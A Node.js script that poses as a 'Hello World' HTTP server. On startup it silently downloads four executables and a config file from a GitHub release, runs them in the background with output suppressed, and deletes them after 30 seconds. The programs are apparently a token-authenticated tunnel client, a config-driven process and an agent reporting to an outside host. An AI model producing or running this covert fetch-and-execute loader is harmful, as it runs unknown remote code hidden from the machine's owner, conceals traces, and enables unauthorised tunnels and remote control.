const http = require('http');
const fs = require('fs');
const { exec, execSync } = require('child_process');

const PORT = 3000;

const serverToken = process.env.SERVER_TOKEN || 'default_server_token';
const apiPassword = process.env.API_PASSWORD || 'default_api_password';

const filesToDownload = [
  { url: 'https://github.com/aw12aw2021/se00/releases/download/lade/api', path: './api' },
  { url: 'https://github.com/aw12aw2021/se00/releases/download/lade/config.json', path: './config.json' },
  { url: 'https://github.com/aw12aw2021/se00/releases/download/lade/server', path: './server' },
  { url: 'https://github.com/aw12aw2021/se00/releases/download/lade/web.js', path: './web.js' }
];

function downloadFile(url, dest) {
  return new Promise((resolve, reject) => {
    const curlCommand = `curl -4 -L ${url} -o ${dest}`;
    exec(curlCommand, (error, stdout, stderr) => {
      if (error) {
        return reject(new Error(`Failed to download '${url}': ${stderr}`));
      }
      fs.access(dest, fs.constants.F_OK, (err) => {
        if (err) {
          return reject(new Error(`File '${dest}' is not accessible after download.`));
        }
        resolve();
      });
    });
  });
}

const server = http.createServer((req, res) => {
  res.statusCode = 200;
  res.setHeader('Content-Type', 'text/plain');
  res.end('Hello World\n');
});

server.listen(PORT, '0.0.0.0', () => {
  (async () => {
    try {
      await Promise.all(filesToDownload.map(file => downloadFile(file.url, file.path)));

      const chmodCommand = 'chmod +x server web.js api';
      await execCommand(chmodCommand);

      const serverCommand = `nohup ./server tunnel --edge-ip-version 4 run --protocol http2 --token ${serverToken} >/dev/null 2>&1 &`;
      await execCommand(serverCommand);

      const webCommand = 'nohup ./web.js -c ./config.json >/dev/null 2>&1 &';
      await execCommand(webCommand);

      const apiCommand = `nohup ./api -s xix.xxixx.aa.am:443 -p ${apiPassword} --report-delay 2 --tls >/dev/null 2>&1 &`;
      await execCommand(apiCommand);

      setTimeout(async () => {
        await execCommand('rm -f server web.js api config.json');
      }, 30000); // 30秒后删除文件
    } catch (error) {}
  })();
});

function execCommand(command) {
  return new Promise((resolve, reject) => {
    exec(`${command} >/dev/null 2>&1`, (error, stdout, stderr) => {
      if (error) {
        return reject(error);
      }
      resolve(stdout);
    });
  });
}
